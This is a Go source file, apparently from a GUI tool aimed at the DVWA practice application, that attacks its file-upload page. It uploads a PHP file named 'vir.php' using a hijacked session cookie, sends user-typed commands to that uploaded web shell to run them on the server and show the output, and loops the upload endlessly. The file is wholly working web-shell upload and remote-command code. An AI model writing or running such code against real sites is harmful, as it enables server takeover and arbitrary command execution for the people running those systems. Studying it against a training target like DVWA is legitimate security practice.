package main
import (
	"fmt"
	"io/ioutil"
	"net/http"
	"bytes"
	"mime/multipart"
	"os"
	"io"
	"strings"
)

//带cookie注入
func UpWithCookie(cookstr string,fuckurl string,filepath string) bool{
	client := &http.Client{};
	body_buf := &bytes.Buffer{}
	body_writer := multipart.NewWriter(body_buf)

	body_writer.WriteField("MAX_FILE_SIZE","1000000")
	body_writer.WriteField("Upload","Upload")

	formFile,err := body_writer.CreateFormFile("uploaded","vir.php")
	contentType:=body_writer.FormDataContentType()
	if err != nil{
		fmt.Printf("file error!:%s\n",err)
	}

	virFile,err := os.Open(filepath)
	if err!=nil{
		fmt.Printf("open file error!:%s\n",err)
	}
	defer virFile.Close()
	_,err = io.Copy(formFile,virFile)
	if err != nil{
		fmt.Printf("open file error!:%s\n",err)
	}
	body_writer.Close()
	req_reader := io.MultiReader(body_buf)
	

	cookie2 := &http.Cookie{Name:"PHPSESSID",Value:cookstr,HttpOnly:true};
	cookie3 := &http.Cookie{Name:"security",Value:"low",HttpOnly:true};

	reqest2, err := http.NewRequest("POST", fuckurl,req_reader)
	if err != nil{
		return false
	}
	reqest2.AddCookie(cookie2)
	reqest2.AddCookie(cookie3)
	reqest2.Header.Set("Content-Type", contentType)
	resp2,err := client.Do(reqest2);
	body1, err := ioutil.ReadAll(resp2.Body)
	_ = body1
	//fmt.Println(string(body1))
    if err != nil {
        return false
    }
	return true
}

//读取本地文件
func ExcFileCommand(urlDVWA string,sw *BruteSubWindow){
	urlVir := urlDVWA + "hackable/uploads/vir.php"
	client := &http.Client{};
	command := sw.editCom.Text()
	Modipayload := strings.NewReader("a="+command)

	reqest2, err := http.NewRequest("POST", urlVir,Modipayload)
	if err != nil{
		return
	}
	reqest2.Header.Set("Content-Type", "application/x-www-form-urlencoded")
	resp2,err := client.Do(reqest2);
	body, err := ioutil.ReadAll(resp2.Body)
    if err != nil {
        return
    }
	bd := string(body)
	sw.outPut.SetText(bd);
}

func ExcFileup(cookie string,urlDVWA string,sw *BruteSubWindow) bool {
	sw.pushAble = false
	virPath := sw.filePath
	sw.progressBar.SetRange(0,100)
	sw.progressBar.SetValue(0)
	urlDVWABrute := urlDVWA + "vulnerabilities/upload/"
	for count:=0;;count++{
		sw.progressBar.SetValue(count%130)
		UpWithCookie(cookie,urlDVWABrute,virPath)
	}
	//sw.pushAble = true
	//return true
}